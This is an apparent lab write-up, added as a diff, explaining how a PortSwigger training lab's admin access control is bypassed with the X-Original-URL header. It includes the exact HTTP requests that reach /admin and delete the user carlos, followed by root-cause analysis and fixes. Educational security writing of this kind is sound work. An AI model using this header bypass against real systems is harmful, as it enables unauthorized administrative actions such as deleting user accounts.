@@ -1,0 +1,344 @@
+# HTTP Header-Based Access Control Bypass via `X-Original-URL`
+
+
+**Lab:** URL-based access control can be circumvented using HTTP headers  
+**Category:** Broken Access Control  
+**Difficulty:** Apprentice  
+**Platform:** PortSwigger Web Security Academy
+
+
+---
+
+
+# Executive Summary
+
+
+The application implemented access controls to restrict access to the administrative interface. Direct requests to `/admin` were blocked.
+
+
+However, the application trusted the `X-Original-URL` HTTP header to determine the resource that should be processed by the backend.
+
+
+By sending a request to an allowed URL while specifying a restricted endpoint through the `X-Original-URL` header, it was possible to bypass the access control mechanism.
+
+
+The vulnerability was then used to access the administrative interface and delete the user **carlos**.
+
+
+---
+
+
+# Vulnerability Classification
+
+
+| Attribute | Value |
+|-----------|-------|
+| Vulnerability | HTTP Header-Based Access Control Bypass |
+| CWE | CWE-639 - Authorization Bypass Through User-Controlled Key |
+| OWASP Top 10 | A01:2021 – Broken Access Control |
+| Severity | High |
+| CVSS v3.1 | 8.8 (High) |
+
+
+---
+
+
+# Target
+
+
+**Application:** PortSwigger Web Security Academy Lab
+
+
+**Affected Endpoint:**
+
+
+```text
+/admin
+Objective
+
+Bypass the access control protecting the administrative interface and delete the user carlos.
+
+Methodology
+Attempt to access the administrative interface directly.
+Observe that direct access to /admin is blocked.
+Intercept the request using Burp Suite.
+Test whether the application trusts alternative URL-related HTTP headers.
+Identify that X-Original-URL controls backend routing.
+Use the header to access /admin.
+Identify the administrative delete functionality.
+Use X-Original-URL to access the delete endpoint.
+Delete the user carlos.
+Reconnaissance
+
+The first step was attempting to access the administrative interface directly:
+
+GET /admin HTTP/2
+Host: LAB-ID.web-security-academy.net
+
+The application denied access to the resource.
+
+This indicated that the administrative functionality was protected by an access control mechanism.
+
+Testing X-Original-URL
+
+The request was sent to Burp Repeater for further testing.
+
+The request URI was changed to / and an X-Original-URL header was added:
+
+GET / HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /invalid
+
+The server returned a response corresponding to the /invalid path.
+
+This indicated that the backend was processing the value supplied through the X-Original-URL header.
+
+Access Control Bypass
+
+The X-Original-URL value was changed from /invalid to /admin:
+
+GET / HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /admin
+
+The application returned the administrative interface.
+
+This confirmed that the access control could be bypassed.
+
+The front-end component effectively saw:
+
+/
+
+while the backend interpreted the request as:
+
+/admin
+Exploitation
+
+After accessing the administrative interface, the available administrative functionality was inspected.
+
+The panel contained functionality for deleting users.
+
+The relevant endpoint was:
+
+/admin/delete
+
+The target user was:
+
+carlos
+
+The request was therefore constructed as:
+
+GET /?username=carlos HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /admin/delete
+
+The backend interpreted the request as:
+
+/admin/delete?username=carlos
+
+The deletion operation was executed successfully.
+
+HTTP Evidence
+Initial Request
+GET /admin HTTP/2
+Host: LAB-ID.web-security-academy.net
+
+Direct access was denied.
+
+Header Testing
+GET / HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /invalid
+
+The response indicated that the backend processed the supplied header value.
+
+Administrative Access
+GET / HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /admin
+
+The administrative interface was returned successfully.
+
+Delete Request
+GET /?username=carlos HTTP/2
+Host: LAB-ID.web-security-academy.net
+X-Original-URL: /admin/delete
+
+The backend processed the request as:
+
+/admin/delete?username=carlos
+
+The user carlos was deleted successfully.
+
+Technical Analysis
+
+The vulnerability was caused by inconsistent URL interpretation between the front-end component and the backend application.
+
+The request could be represented as:
+
+Attacker
+   │
+   │ GET /
+   │ X-Original-URL: /admin
+   ▼
+Reverse Proxy
+   │
+   │ Checks "/"
+   │
+   │ Request allowed
+   ▼
+Backend Application
+   │
+   │ Processes X-Original-URL
+   ▼
+/admin
+   │
+   ▼
+Administrative Interface
+
+The important difference was:
+
+URL checked by the front-end:
+
+
+/
+
+versus:
+
+URL processed by the backend:
+
+
+/admin
+
+Because the access-control mechanism evaluated a different URL from the one ultimately processed by the application, the restriction could be bypassed.
+
+Root Cause
+
+The root cause was trusting a client-controlled HTTP header to determine the resource being accessed.
+
+The application trusted:
+
+X-Original-URL
+
+while the access-control mechanism evaluated the URL in the request line.
+
+This created a discrepancy between authorization and request processing.
+
+An attacker could therefore send:
+
+GET /
+X-Original-URL: /admin
+
+instead of:
+
+GET /admin
+
+The first request bypassed the front-end restriction while still reaching the privileged backend resource.
+
+Impact
+
+An attacker could potentially:
+
+Bypass access-control restrictions.
+Access administrative functionality.
+Execute privileged operations.
+Delete users.
+Modify sensitive application data.
+Access other protected endpoints.
+
+The final impact depends on the functionality exposed through the protected administrative interface.
+
+Security Recommendations
+Do Not Trust Client-Controlled Routing Headers
+
+Headers such as:
+
+X-Original-URL
+X-Rewrite-URL
+X-Forwarded-Prefix
+
+should not be trusted when supplied directly by an external client.
+
+Strip Internal Headers
+
+If these headers are required for internal routing, the reverse proxy should remove externally supplied versions and generate trusted values itself.
+
+For example:
+
+proxy_set_header X-Original-URL "";
+proxy_set_header X-Rewrite-URL "";
+Perform Authorization on the Final Resource
+
+Authorization must be performed against the actual resource that will be processed by the backend.
+
+The application should not authorize:
+
+/
+
+and subsequently execute:
+
+/admin
+
+without performing authorization against /admin.
+
+Maintain Consistent URL Interpretation
+
+All components involved in processing a request should agree on the effective URL.
+
+A secure request flow should be:
+
+HTTP Request
+     │
+     ▼
+URL Normalization
+     │
+     ▼
+URL Rewriting
+     │
+     ▼
+Authorization
+     │
+     ▼
+Resource Execution
+Enforce Server-Side Authorization
+
+Administrative privileges should always be validated server-side based on trusted authentication and authorization information.
+
+Access to endpoints such as:
+
+/admin
+/admin/delete
+
+should require an appropriate authenticated role regardless of how the request URL was constructed.
+
+References
+OWASP Top 10 2021 – A01: Broken Access Control
+CWE-639 – Authorization Bypass Through User-Controlled Key
+PortSwigger Web Security Academy – Access Control Vulnerabilities
+Conclusion
+
+The application was vulnerable to an HTTP Header-Based Access Control Bypass because the front-end and backend interpreted the requested URL differently.
+
+Direct access to:
+
+/admin
+
+was blocked, but the following request bypassed the restriction:
+
+GET /
+X-Original-URL: /admin
+
+The same technique was then used to invoke the administrative deletion functionality:
+
+GET /?username=carlos
+X-Original-URL: /admin/delete
+
+The backend interpreted the request as:
+
+/admin/delete?username=carlos
+
+allowing the attacker to delete the target user.
+
+Lab Status: ✅ Solved
+
+
